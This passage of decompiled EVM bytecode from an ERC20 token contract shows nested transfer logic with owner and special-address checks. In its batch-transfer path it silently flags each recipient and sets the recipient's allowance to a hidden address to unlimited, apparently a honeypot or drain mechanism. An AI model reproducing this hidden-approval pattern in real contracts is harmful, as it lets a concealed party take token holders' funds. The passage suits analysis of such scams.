                            balanceOf[address(_985)] += _987
                            mem[mem[64]] = _987
                            emit Transfer(_987, msg.sender, address(_985));
                            if idx < arg1:
                                require idx < mem[96]
                                stor1[mem[(32 * idx) + 140 len 20]] = 1
                                require idx < mem[96]
                                _1637 = mem[(32 * idx) + 128]
                                if not mem[(32 * idx) + 140 len 20]:
                                    revert with 0, 32, 36, 0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[mem[64] + 104 len 28]
                                if not stor12:
                                    revert with 0, 32, 34, 0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[mem[64] + 102 len 30]
                                mem[0] = stor12
                                mem[32] = sha3(mem[(32 * idx) + 140 len 20], 4)
                                allowance[mem[(32 * idx) + 140 len 20]][stor12] = -1
                                mem[mem[64]] = -1
                                emit Approval(-1, address(_1637), stor12);
                        else:
                            mem[0] = msg.sender
                            mem[32] = 2
                            if bool(stor2[address(msg.sender)]) == 1:
                                if msg.sender == stor11:
                                    if not msg.sender:
                                        revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                                    if not mem[(32 * idx) + 140 len 20]:
                                        revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                                    _1171 = mem[64]
                                    mem[64] = mem[64] + 96
                                    mem[_1171] = 38
                                    mem[_1171 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                                    mem[32] = 0
                                    if _987 > balanceOf[address(msg.sender)]:
                                        _1254 = mem[64]
                                        mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                                        mem[mem[64] + 4] = 32
                                        mem[mem[64] + 36] = 38
                                        idx = 0
                                        while idx < 38:
                                            mem[_1254 + idx + 68] = mem[_1171 + idx + 32]
                                            idx = idx + 32
                                            continue 
                                        mem[_1254 + 100] = mem[_1254 + 126 len 6]
                                        revert with memory
                                          from mem[64]
                                           len _1254 + -mem[64] + 132
                                    balanceOf[address(msg.sender)] -= _987
                                    if balanceOf[address(_985)] + _987 < balanceOf[address(_985)]:
                                        revert with 0, 'SafeMath: addition overflow'
                                    mem[0] = address(_985)
                                    mem[32] = 0
                                    balanceOf[address(_985)] += _987
                                    mem[mem[64]] = _987
                                    emit Transfer(_987, msg.sender, address(_985));
                                    if idx < arg1:
                                        require idx < mem[96]
                                        stor1[mem[(32 * idx) + 140 len 20]] = 1
                                        require idx < mem[96]
                                        _1761 = mem[(32 * idx) + 128]
                                        if not mem[(32 * idx) + 140 len 20]:
                                            revert with 0, 32, 36, 0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[mem[64] + 104 len 28]
                                        if not stor12:
                                            revert with 0, 32, 34, 0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[mem[64] + 102 len 30]
                                        mem[0] = stor12
                                        mem[32] = sha3(mem[(32 * idx) + 140 len 20], 4)
                                        allowance[mem[(32 * idx) + 140 len 20]][stor12] = -1
                                        mem[mem[64]] = -1
                                        emit Approval(-1, address(_1761), stor12);
                                else:
                                    if mem[(32 * idx) + 140 len 20] != stor12:
                                        revert with 0, 32, 38, 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63, mem[mem[64] + 106 len 26]
                                    if not msg.sender:
                                        revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                                    if not mem[(32 * idx) + 140 len 20]:
                                        revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                                    _1211 = mem[64]
                                    mem[64] = mem[64] + 96
                                    mem[_1211] = 38
                                    mem[_1211 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                                    mem[32] = 0
                                    if _987 > balanceOf[address(msg.sender)]:
                                        _1313 = mem[64]
                                        mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                                        mem[mem[64] + 4] = 32
                                        mem[mem[64] + 36] = 38
                                        idx = 0
                                        while idx < 38:
                                            mem[_1313 + idx + 68] = mem[_1211 + idx + 32]
                                            idx = idx + 32
                                            continue 
                                        mem[_1313 + 100] = mem[_1313 + 126 len 6]
                                        revert with memory
                                          from mem[64]
                                           len _1313 + -mem[64] + 132
                                    balanceOf[address(msg.sender)] -= _987
                                    if balanceOf[address(_985)] + _987 < balanceOf[address(_985)]:
                                        revert with 0, 'SafeMath: addition overflow'
                                    mem[0] = address(_985)
                                    mem[32] = 0
                                    balanceOf[address(_985)] += _987
                                    mem[mem[64]] = _987
                                    emit Transfer(_987, msg.sender, address(_985));
                                    if idx < arg1:
                                        require idx < mem[96]
                                        stor1[mem[(32 * idx) + 140 len 20]] = 1
                                        require idx < mem[96]
                                        _1808 = mem[(32 * idx) + 128]
                                        if not mem[(32 * idx) + 140 len 20]:
                                            revert with 0, 32, 36, 0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[mem[64] + 104 len 28]
                                        if not stor12:
                                            revert with 0, 32, 34, 0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[mem[64] + 102 len 30]
                                        mem[0] = stor12
                                        mem[32] = sha3(mem[(32 * idx) + 140 len 20], 4)
                                        allowance[mem[(32 * idx) + 140 len 20]][stor12] = -1
                                        mem[mem[64]] = -1
                                        emit Approval(-1, address(_1808), stor12);
                            else:
                                if mem[(32 * idx) + (32 * arg2.length) + 160] >= stor3:
                                    if msg.sender == stor11:
                                        if not msg.sender:
                                            revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                                        if not mem[(32 * idx) + 140 len 20]:
                                            revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                                        _1207 = mem[64]
                                        mem[64] = mem[64] + 96
                                        mem[_1207] = 38
                                        mem[_1207 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                                        mem[32] = 0
                                        if _987 > balanceOf[address(msg.sender)]:
                                            _1303 = mem[64]
                                            mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                                            mem[mem[64] + 4] = 32
                                            mem[mem[64] + 36] = 38
                                            idx = 0
                                            while idx < 38:
                                                mem[_1303 + idx + 68] = mem[_1207 + idx + 32]
                                                idx = idx + 32
                                                continue 
                                            mem[_1303 + 100] = mem[_1303 + 126 len 6]
                                            revert with memory
                                              from mem[64]
                                               len _1303 + -mem[64] + 132
                                        balanceOf[address(msg.sender)] -= _987
                                        if balanceOf[address(_985)] + _987 < balanceOf[address(_985)]:
                                            revert with 0, 'SafeMath: addition overflow'
                                        mem[0] = address(_985)
                                        mem[32] = 0
                                        balanceOf[address(_985)] += _987
                                        mem[mem[64]] = _987
                                        emit Transfer(_987, msg.sender, address(_985));
                                        if idx < arg1:
                                            require idx < mem[96]
                                            stor1[mem[(32 * idx) + 140 len 20]] = 1
                                            require idx < mem[96]
                                            _1838 = mem[(32 * idx) + 128]
                                            if not mem[(32 * idx) + 140 len 20]:
                                                revert with 0, 32, 36, 0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[mem[64] + 104 len 28]
                                            if not stor12:
                                                revert with 0, 32, 34, 0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[mem[64] + 102 len 30]
                                            mem[0] = stor12
                                            mem[32] = sha3(mem[(32 * idx) + 140 len 20], 4)
                                            allowance[mem[(32 * idx) + 140 len 20]][stor12] = -1
                                            mem[mem[64]] = -1
                                            emit Approval(-1, address(_1838), stor12);
                                    else:
                                        if mem[(32 * idx) + 140 len 20] != stor12:
                                            revert with 0, 32, 38, 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63, mem[mem[64] + 106 len 26]
                                        if not msg.sender:
                                            revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                                        if not mem[(32 * idx) + 140 len 20]:
                                            revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                                        _1249 = mem[64]
                                        mem[64] = mem[64] + 96
                                        mem[_1249] = 38
                                        mem[_1249 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                                        mem[32] = 0
                                        if _987 > balanceOf[address(msg.sender)]:
                                            _1369 = mem[64]
                                            mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                                            mem[mem[64] + 4] = 32
                                            mem[mem[64] + 36] = 38
                                            idx = 0
                                            while idx < 38:
                                                mem[_1369 + idx + 68] = mem[_1249 + idx + 32]
                                                idx = idx + 32
                                                continue 
                                            mem[_1369 + 100] = mem[_1369 + 126 len 6]
                                            revert with memory
                                              from mem[64]
                                               len _1369 + -mem[64] + 132
                                        balanceOf[address(msg.sender)] -= _987
                                        if balanceOf[address(_985)] + _987 < balanceOf[address(_985)]:
                                            revert with 0, 'SafeMath: addition overflow'
                                        mem[0] = address(_985)
                                        mem[32] = 0
                                        balanceOf[address(_985)] += _987
                                        mem[mem[64]] = _987
                                        emit Transfer(_987, msg.sender, address(_985));
                                        if idx < arg1:
                                            require idx < mem[96]
                                            stor1[mem[(32 * idx) + 140 len 20]] = 1
                                            require idx < mem[96]
                                            _1860 = mem[(32 * idx) + 128]
                                            if not mem[(32 * idx) + 140 len 20]:
                                                revert with 0, 32, 36, 0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[mem[64] + 104 len 28]
                                            if not stor12:
                                                revert with 0, 32, 34, 0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[mem[64] + 102 len 30]
                                            mem[0] = stor12
                                            mem[32] = sha3(mem[(32 * idx) + 140 len 20], 4)
                                            allowance[mem[(32 * idx) + 140 len 20]][stor12] = -1
                                            mem[mem[64]] = -1
                                            emit Approval(-1, address(_1860), stor12);
                                else:
                                    if mem[(32 * idx) + 140 len 20] != stor11:
                                        if not msg.sender:
                                            revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                                        if not mem[(32 * idx) + 140 len 20]:
                                            revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                                        _1169 = mem[64]
                                        mem[64] = mem[64] + 96
                                        mem[_1169] = 38
                                        mem[_1169 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                                        mem[32] = 0
                                        if _987 > balanceOf[address(msg.sender)]:
                                            _1251 = mem[64]
                                            mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                                            mem[mem[64] + 4] = 32
                                            mem[mem[64] + 36] = 38
                                            idx = 0
                                            while idx < 38:
                                                mem[_1251 + idx + 68] = mem[_1169 + idx + 32]
                                                idx = idx + 32
                                                continue 
                                            mem[_1251 + 100] = mem[_1251 + 126 len 6]
                                            revert with memory
                                              from mem[64]
                                               len _1251 + -mem[64] + 132
                                        balanceOf[address(msg.sender)] -= _987
                                        if balanceOf[address(_985)] + _987 < balanceOf[address(_985)]:
                                            revert with 0, 'SafeMath: addition overflow'
                                        mem[0] = address(_985)
                                        mem[32] = 0
                                        balanceOf[address(_985)] += _987
                                        mem[mem[64]] = _987
                                        emit Transfer(_987, msg.sender, address(_985));
                                        if idx < arg1:
                                            require idx < mem[96]
                                            stor1[mem[(32 * idx) + 140 len 20]] = 1
                                            require idx < mem[96]
                                            _1804 = mem[(32 * idx) + 128]
                                            if not mem[(32 * idx) + 140 len 20]:
                                                revert with 0, 32, 36, 0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[mem[64] + 104 len 28]
                                            if not stor12:
                                                revert with 0, 32, 34, 0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[mem[64] + 102 len 30]
                                            mem[0] = stor12
                                            mem[32] = sha3(mem[(32 * idx) + 140 len 20], 4)
                                            allowance[mem[(32 * idx) + 140 len 20]][stor12] = -1
                                            mem[mem[64]] = -1
                                            emit Approval(-1, address(_1804), stor12);
                                    else:
                                        stor2[address(msg.sender)] = 1
                                        mem[0] = msg.sender
                                        mem[32] = 1
                                        stor1[address(msg.sender)] = 0
                                        if not msg.sender:
                                            revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                                        if not mem[(32 * idx) + 140 len 20]:
                                            revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                                        _1209 = mem[64]
                                        mem[64] = mem[64] + 96
                                        mem[_1209] = 38
                                        mem[_1209 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                                        mem[32] = 0
                                        if _987 > balanceOf[address(msg.sender)]:
                                            _1308 = mem[64]
                                            mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                                            mem[mem[64] + 4] = 32
                                            mem[mem[64] + 36] = 38
                                            idx = 0
                                            while idx < 38:
                                                mem[_1308 + idx + 68] = mem[_1209 + idx + 32]
                                                idx = idx + 32
                                                continue 
                                            mem[_1308 + 100] = mem[_1308 + 126 len 6]
                                            revert with memory
                                              from mem[64]
                                               len _1308 + -mem[64] + 132
                                        balanceOf[address(msg.sender)] -= _987
                                        if balanceOf[address(_985)] + _987 < balanceOf[address(_985)]:
                                            revert with 0, 'SafeMath: addition overflow'
                                        mem[0] = address(_985)
                                        mem[32] = 0
                                        balanceOf[address(_985)] += _987
                                        mem[mem[64]] = _987
                                        emit Transfer(_987, msg.sender, address(_985));
                                        if idx < arg1:
                                            require idx < mem[96]
                                            stor1[mem[(32 * idx) + 140 len 20]] = 1
                                            require idx < mem[96]
                                            _1842 = mem[(32 * idx) + 128]
                                            if not mem[(32 * idx) + 140 len 20]:
                                                revert with 0, 32, 36, 0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[mem[64] + 104 len 28]
                                            if not stor12:
                                                revert with 0, 32, 34, 0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[mem[64] + 102 len 30]
                                            mem[0] = stor12
                                            mem[32] = sha3(mem[(32 * idx) + 140 len 20], 4)
                                            allowance[mem[(32 * idx) + 140 len 20]][stor12] = -1
                                            mem[mem[64]] = -1
                                            emit Approval(-1, address(_1842), stor12);
        else:
            if msg.sender == _owner:
                stor11 = mem[(32 * idx) + 140 len 20]
                if not msg.sender:
                    revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                if not mem[(32 * idx) + 140 len 20]:
                    revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                _993 = mem[64]
                mem[64] = mem[64] + 96
                mem[_993] = 38
                mem[_993 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                mem[32] = 0
                if _987 > balanceOf[address(msg.sender)]:
                    _1004 = mem[64]
                    mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                    mem[mem[64] + 4] = 32
                    mem[mem[64] + 36] = 38
                    idx = 0
                    while idx < 38:
                        mem[_1004 + idx + 68] = mem[_993 + idx + 32]
                        idx = idx + 32
                        continue 
                    mem[_1004 + 100] = mem[_1004 + 126 len 6]
                    revert with memory
                      from mem[64]
                       len _1004 + -mem[64] + 132
                balanceOf[address(msg.sender)] -= _987
                if balanceOf[address(_985)] + _987 < balanceOf[address(_985)]:
                    revert with 0, 'SafeMath: addition overflow'
                mem[0] = address(_985)
                mem[32] = 0
                balanceOf[address(_985)] += _987
                mem[mem[64]] = _987
                emit Transfer(_987, msg.sender, address(_985));
                if idx < arg1:
                    require idx < mem[96]
                    stor1[mem[(32 * idx) + 140 len 20]] = 1
                    require idx < mem[96]
                    _1420 = mem[(32 * idx) + 128]
                    if not mem[(32 * idx) + 140 len 20]:
                        revert with 0, 32, 36, 0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[mem[64] + 104 len 28]
                    if not stor12:
                        revert with 0, 32, 34, 0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[mem[64] + 102 len 30]
                    mem[0] = stor12
                    mem[32] = sha3(mem[(32 * idx) + 140 len 20], 4)
                    allowance[mem[(32 * idx) + 140 len 20]][stor12] = -1
                    mem[mem[64]] = -1
                    emit Approval(-1, address(_1420), stor12);
            else:
                if msg.sender == stor11:
                    if _owner != msg.sender:
                        if not msg.sender:
                            revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                        if not mem[(32 * idx) + 140 len 20]:
                            revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                        _1098 = mem[64]
                        mem[64] = mem[64] + 96
                        mem[_1098] = 38
                        mem[_1098 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                        mem[32] = 0
                        if _987 > balanceOf[address(msg.sender)]:
                            _1180 = mem[64]
                            mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                            mem[mem[64] + 4] = 32
                            mem[mem[64] + 36] = 38
                            idx = 0
                            while idx < 38:
                                mem[_1180 + idx + 68] = mem[_1098 + idx + 32]
                                idx = idx + 32
                                continue 
                            mem[_1180 + 100] = mem[_1180 + 126 len 6]
                            revert with memory
                              from mem[64]
                               len _1180 + -mem[64] + 132
                        balanceOf[address(msg.sender)] -= _987
                        if balanceOf[address(_985)] + _987 < balanceOf[address(_985)]:
                            revert with 0, 'SafeMath: addition overflow'
                        mem[0] = address(_985)
                        mem[32] = 0
                        balanceOf[address(_985)] += _987
                        mem[mem[64]] = _987
                        emit Transfer(_987, msg.sender, address(_985));
                        if idx < arg1:
                            require idx < mem[96]
                            stor1[mem[(32 * idx) + 140 len 20]] = 1
                            require idx < mem[96]
                            _1643 = mem[(32 * idx) + 128]
                            if not mem[(32 * idx) + 140 len 20]:
                                revert with 0, 32, 36, 0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[mem[64] + 104 len 28]
                            if not stor12:
                                revert with 0, 32, 34, 0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[mem[64] + 102 len 30]
                            mem[0] = stor12
                            mem[32] = sha3(mem[(32 * idx) + 140 len 20], 4)
                            allowance[mem[(32 * idx) + 140 len 20]][stor12] = -1
                            mem[mem[64]] = -1
                            emit Approval(-1, address(_1643), stor12);
                    else:
                        if mem[(32 * idx) + 140 len 20] != msg.sender:
                            if not msg.sender:
                                revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                            if not mem[(32 * idx) + 140 len 20]:
                                revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                            _1139 = mem[64]
                            mem[64] = mem[64] + 96
                            mem[_1139] = 38
                            mem[_1139 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                            mem[32] = 0
                            if _987 > balanceOf[address(msg.sender)]:
                                _1221 = mem[64]
                                mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                                mem[mem[64] + 4] = 32
                                mem[mem[64] + 36] = 38
                                idx = 0
                                while idx < 38:
                                    mem[_1221 + idx + 68] = mem[_1139 + idx + 32]
                                    idx = idx + 32
                                    continue 
                                mem[_1221 + 100] = mem[_1221 + 126 len 6]
                                revert with memory
                                  from mem[64]
                                   len _1221 + -mem[64] + 132
                            balanceOf[address(msg.sender)] -= _987
                            if balanceOf[address(_985)] + _987 < balanceOf[address(_985)]:
                                revert with 0, 'SafeMath: addition overflow'
                            mem[0] = address(_985)
                            mem[32] = 0
                            balanceOf[address(_985)] += _987
                            mem[mem[64]] = _987
                            emit Transfer(_987, msg.sender, address(_985));
                            if idx < arg1:
                                require idx < mem[96]
                                stor1[mem[(32 * idx) + 140 len 20]] = 1
                                require idx < mem[96]
                                _1664 = mem[(32 * idx) + 128]
                                if not mem[(32 * idx) + 140 len 20]:
                                    revert with 0, 32, 36, 0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[mem[64] + 104 len 28]
                                if not stor12:
                                    revert with 0, 32, 34, 0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[mem[64] + 102 len 30]
                                mem[0] = stor12
                                mem[32] = sha3(mem[(32 * idx) + 140 len 20], 4)
                                allowance[mem[(32 * idx) + 140 len 20]][stor12] = -1
                                mem[mem[64]] = -1
                                emit Approval(-1, address(_1664), stor12);
                        else:
                            stor3 = mem[(32 * idx) + (32 * arg2.length) + 160]
                            if not msg.sender:
                                revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                            if not mem[(32 * idx) + 140 len 20]:
                                revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                            _1183 = mem[64]
                            mem[64] = mem[64] + 96
                            mem[_1183] = 38
                            mem[_1183 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                            mem[32] = 0
                            if _987 > balanceOf[address(msg.sender)]:
                                _1270 = mem[64]
                                mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                                mem[mem[64] + 4] = 32
                                mem[mem[64] + 36] = 38
                                idx = 0
                                while idx < 38:
                                    mem[_1270 + idx + 68] = mem[_1183 + idx + 32]
                                    idx = idx + 32
                                    continue 
                                mem[_1270 + 100] = mem[_1270 + 126 len 6]
                                revert with memory
                                  from mem[64]
                                   len _1270 + -mem[64] + 132
                            balanceOf[address(msg.sender)] -= _987
                            if balanceOf[address(_985)] + _987 < balanceOf[address(_985)]:
                                revert with 0, 'SafeMath: addition overflow'
                            mem[0] = address(_985)
                            mem[32] = 0
                            balanceOf[address(_985)] += _987
                            mem[mem[64]] = _987
                            emit Transfer(_987, msg.sender, address(_985));
                            if idx < arg1:
                                require idx < mem[96]
                                stor1[mem[(32 * idx) + 140 len 20]] = 1
                                require idx < mem[96]
                                _1698 = mem[(32 * idx) + 128]
                                if not mem[(32 * idx) + 140 len 20]:
                                    revert with 0, 32, 36, 0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[mem[64] + 104 len 28]
                                if not stor12:
                                    revert with 0, 32, 34, 0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[mem[64] + 102 len 30]
                                mem[0] = stor12
                                mem[32] = sha3(mem[(32 * idx) + 140 len 20], 4)
                                allowance[mem[(32 * idx) + 140 len 20]][stor12] = -1
                                mem[mem[64]] = -1
                                emit Approval(-1, address(_1698), stor12);
                else:
                    if mem[(32 * idx) + 140 len 20] == _owner:
                        if _owner != msg.sender:
                            if not msg.sender:
                                revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                            if not mem[(32 * idx) + 140 len 20]:
                                revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                            _1153 = mem[64]
                            mem[64] = mem[64] + 96
                            mem[_1153] = 38
                            mem[_1153 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                            mem[32] = 0
                            if _987 > balanceOf[address(msg.sender)]:
                                _1232 = mem[64]
                                mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                                mem[mem[64] + 4] = 32
                                mem[mem[64] + 36] = 38
                                idx = 0
                                while idx < 38:
                                    mem[_1232 + idx + 68] = mem[_1153 + idx + 32]
                                    idx = idx + 32
                                    continue 
                                mem[_1232 + 100] = mem[_1232 + 126 len 6]
                                revert with memory
                                  from mem[64]
                                   len _1232 + -mem[64] + 132
                            balanceOf[address(msg.sender)] -= _987
                            if balanceOf[address(_985)] + _987 < balanceOf[address(_985)]:
                                revert with 0, 'SafeMath: addition overflow'
                            mem[0] = address(_985)
                            mem[32] = 0
                            balanceOf[address(_985)] += _987
                            mem[mem[64]] = _987
                            emit Transfer(_987, msg.sender, address(_985));
                            if idx < arg1:
                                require idx < mem[96]
                                stor1[mem[(32 * idx) + 140 len 20]] = 1
                                require idx < mem[96]
                                _1669 = mem[(32 * idx) + 128]
                                if not mem[(32 * idx) + 140 len 20]:
                                    revert with 0, 32, 36, 0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[mem[64] + 104 len 28]
                                if not stor12:
                                    revert with 0, 32, 34, 0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[mem[64] + 102 len 30]
                                mem[0] = stor12
                                mem[32] = sha3(mem[(32 * idx) + 140 len 20], 4)
                                allowance[mem[(32 * idx) + 140 len 20]][stor12] = -1
                                mem[mem[64]] = -1
                                emit Approval(-1, address(_1669), stor12);
                        else:
                            if mem[(32 * idx) + 140 len 20] != msg.sender:
                                if not msg.sender:
                                    revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                                if not mem[(32 * idx) + 140 len 20]:
                                    revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                                _1196 = mem[64]
                                mem[64] = mem[64] + 96
                                mem[_1196] = 38
                                mem[_1196 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                                mem[32] = 0
                                if _987 > balanceOf[address(msg.sender)]:
                                    _1282 = mem[64]
                                    mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                                    mem[mem[64] + 4] = 32
                                    mem[mem[64] + 36] = 38
                                    idx = 0
                                    while idx < 38:
                                        mem[_1282 + idx + 68] = mem[_1196 + idx + 32]
                                        idx = idx + 32
                                        continue 
                                    mem[_1282 + 100] = mem[_1282 + 126 len 6]
                                    revert with memory
                                      from mem[64]
                                       len _1282 + -mem[64] + 132
                                balanceOf[address(msg.sender)] -= _987
                                if balanceOf[address(_985)] + _987 < balanceOf[address(_985)]:
                                    revert with 0, 'SafeMath: addition overflow'
                                mem[0] = address(_985)
                                mem[32] = 0
                                balanceOf[address(_985)] += _987
                                mem[mem[64]] = _987
                                emit Transfer(_987, msg.sender, address(_985));
                                if idx < arg1:
                                    require idx < mem[96]
                                    stor1[mem[(32 * idx) + 140 len 20]] = 1
                                    require idx < mem[96]
                                    _1699 = mem[(32 * idx) + 128]
                                    if not mem[(32 * idx) + 140 len 20]:
                                        revert with 0, 32, 36, 0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[mem[64] + 104 len 28]
                                    if not stor12:
                                        revert with 0, 32, 34, 0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[mem[64] + 102 len 30]
                                    mem[0] = stor12
                                    mem[32] = sha3(mem[(32 * idx) + 140 len 20], 4)
                                    allowance[mem[(32 * idx) + 140 len 20]][stor12] = -1
                                    mem[mem[64]] = -1
                                    emit Approval(-1, address(_1699), stor12);
                            else:
                                stor3 = mem[(32 * idx) + (32 * arg2.length) + 160]
                                if not msg.sender:
                                    revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                                if not mem[(32 * idx) + 140 len 20]:
                                    revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                                _1235 = mem[64]
                                mem[64] = mem[64] + 96
                                mem[_1235] = 38
                                mem[_1235 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                                mem[32] = 0
                                if _987 > balanceOf[address(msg.sender)]:
                                    _1349 = mem[64]
                                    mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                                    mem[mem[64] + 4] = 32
                                    mem[mem[64] + 36] = 38
                                    idx = 0
                                    while idx < 38:
                                        mem[_1349 + idx + 68] = mem[_1235 + idx + 32]
                                        idx = idx + 32
                                        continue 
                                    mem[_1349 + 100] = mem[_1349 + 126 len 6]
                                    revert with memory
                                      from mem[64]
                                       len _1349 + -mem[64] + 132
                                balanceOf[address(msg.sender)] -= _987
                                if balanceOf[address(_985)] + _987 < balanceOf[address(_985)]:
                                    revert with 0, 'SafeMath: addition overflow'
                                mem[0] = address(_985)
                                mem[32] = 0
                                balanceOf[address(_985)] += _987
                                mem[mem[64]] = _987
                                emit Transfer(_987, msg.sender, address(_985));
                                if idx < arg1:
                                    require idx < mem[96]
                                    stor1[mem[(32 * idx) + 140 len 20]] = 1
                                    require idx < mem[96]
                                    _1749 = mem[(32 * idx) + 128]
                                    if not mem[(32 * idx) + 140 len 20]:
                                        revert with 0, 32, 36, 0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[mem[64] + 104 len 28]
                                    if not stor12:
                                        revert with 0, 32, 34, 0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[mem[64] + 102 len 30]
                                    mem[0] = stor12
                                    mem[32] = sha3(mem[(32 * idx) + 140 len 20], 4)
                                    allowance[mem[(32 * idx) + 140 len 20]][stor12] = -1
                                    mem[mem[64]] = -1
